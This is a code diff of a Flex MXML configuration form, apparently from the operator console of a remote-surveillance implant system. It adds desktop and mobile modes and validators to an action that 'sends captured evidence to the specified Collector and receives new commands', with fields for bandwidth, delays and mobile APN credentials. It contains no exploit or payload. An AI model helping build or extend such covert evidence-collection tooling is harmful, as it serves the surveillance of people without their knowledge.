@@ -2,7 +2,7 @@
 <actions:ActionFields xmlns:fx="http://ns.adobe.com/mxml/2009"
                       xmlns:s="library://ns.adobe.com/flex/spark"
                       xmlns:mx="library://ns.adobe.com/flex/mx"
-                      xmlns:actions="it.ht.rcs.console.operations.view.configuration.advanced.forms.actions.*">
+                      xmlns:actions="it.ht.rcs.console.operations.view.configuration.advanced.forms.actions.*" xmlns:utils="it.ht.rcs.console.utils.*">
   
   <fx:Script>
     <![CDATA[
@@ -11,10 +11,16 @@
       
       import mx.collections.ListCollectionView;
       
+      [Bindable]
+      public var mobile:Boolean;
+      
       override public function fillFields():void
       {
         // The very first call of init is from addedToStage. Nothing is created and we wait creation complete. Subsequent addedToStage will be ok
         if (!bandwidth) return;
+        
+        currentState = mobile ? 'mobile' : 'desktop';
+        
         var entryPoints:ListCollectionView = CollectorManager.instance.getEntryPointsView();
         host.dataProvider = entryPoints;
         setEntryPoint(entryPoints);
@@ -54,11 +60,34 @@
       {
         return new Collector({name:value, address:value});
       }
+      
+      override public function isValid():Boolean
+      {
+        return currentState == 'mobile' ? mobileVal.isValid() : desktopVal.isValid();
+      }
     ]]>
   </fx:Script>
   
-  <s:Label width="330"
-           text="The action is triggered when the machine makes a connection to the specified address"/>
+  <fx:Declarations>
+    <fx:Array id="desktopVals">
+      <mx:NumberValidator property="text" required="true" source="{bandwidth}" triggerEvent="" minValue="1"/>
+      <mx:NumberValidator property="text" required="true" source="{min}" triggerEvent=""/>
+      <mx:NumberValidator property="text" required="true" source="{max}" triggerEvent=""/>
+    </fx:Array>
+    <utils:MetaValidator id="desktopVal" validators="{desktopVals}"/>
+    <fx:Array id="mobileVals">
+      <mx:StringValidator property="text" required="true" source="{apnName}" triggerEvent=""/>
+    </fx:Array>
+    <utils:MetaValidator id="mobileVal" validators="{mobileVals}"/>
+  </fx:Declarations>
+  
+  <actions:states>
+    <s:State name="desktop"/>
+    <s:State name="mobile"/>
+  </actions:states>
+  
+  <s:Label width="330" lineHeight="16"
+           text="Sends captured evidence to the specified Collector and receives new commands and configurations"/>
   
   <s:Form>
     
@@ -67,21 +96,21 @@
                   requireSelection="true"/>
     </s:FormItem>
     
-    <s:FormItem label="Bandwidth">
+    <s:FormItem includeIn="desktop" label="Bandwidth">
       <s:HGroup verticalAlign="middle">
         <s:TextInput id="bandwidth" restrict="0-9" textAlign="center" widthInChars="5"/>
         <s:Label paddingTop="1" text=" kB/s"/>
       </s:HGroup>
     </s:FormItem>
     
-    <s:FormItem label="Min delay">
+    <s:FormItem includeIn="desktop" label="Min delay">
       <s:HGroup verticalAlign="middle">
         <s:TextInput id="min" restrict="0-9" textAlign="center" widthInChars="3"/>
         <s:Label paddingTop="1" text=" seconds"/>
       </s:HGroup>
     </s:FormItem>
     
-    <s:FormItem label="Max delay">
+    <s:FormItem includeIn="desktop" label="Max delay">
       <s:HGroup verticalAlign="middle">
         <s:TextInput id="max" restrict="0-9" textAlign="center" widthInChars="3"/>
         <s:Label paddingTop="1" text=" seconds"/>
@@ -91,8 +120,8 @@
     <s:FormItem label="Stop on success">
       <s:CheckBox id="stop"/>
     </s:FormItem>
-    
-    <s:FormItem label="Type">
+
+    <s:FormItem includeIn="mobile" label="Type">
       <s:DropDownList id="type" width="100" requireSelection="true">
         <s:ArrayCollection>
           <fx:String>Internet</fx:String>
@@ -101,27 +130,27 @@
       </s:DropDownList>
     </s:FormItem>
     
-    <s:FormItem visible="{type.selectedIndex == 0}" label="Force Wifi"
+    <s:FormItem includeIn="mobile" visible="{type.selectedIndex == 0}" label="Force Wifi"
                 includeInLayout="{type.selectedIndex == 0}">
       <s:CheckBox id="wifi"/>
     </s:FormItem>
     
-    <s:FormItem visible="{type.selectedIndex == 0}" label="Force Cell"
+    <s:FormItem includeIn="mobile" visible="{type.selectedIndex == 0}" label="Force Cell"
                 includeInLayout="{type.selectedIndex == 0}">
       <s:CheckBox id="cell"/>
     </s:FormItem>
     
-    <s:FormItem visible="{type.selectedIndex == 1}" label="Name"
+    <s:FormItem includeIn="mobile" visible="{type.selectedIndex == 1}" label="Name"
                 includeInLayout="{type.selectedIndex == 1}">
       <s:TextInput id="apnName"/>
     </s:FormItem>
     
-    <s:FormItem visible="{type.selectedIndex == 1}" label="User"
+    <s:FormItem includeIn="mobile" visible="{type.selectedIndex == 1}" label="User"
                 includeInLayout="{type.selectedIndex == 1}">
       <s:TextInput id="user"/>
     </s:FormItem>
     
-    <s:FormItem visible="{type.selectedIndex == 1}" label="Pass"
+    <s:FormItem includeIn="mobile" visible="{type.selectedIndex == 1}" label="Pass"
                 includeInLayout="{type.selectedIndex == 1}">
       <s:TextInput id="pass"/>
     </s:FormItem>
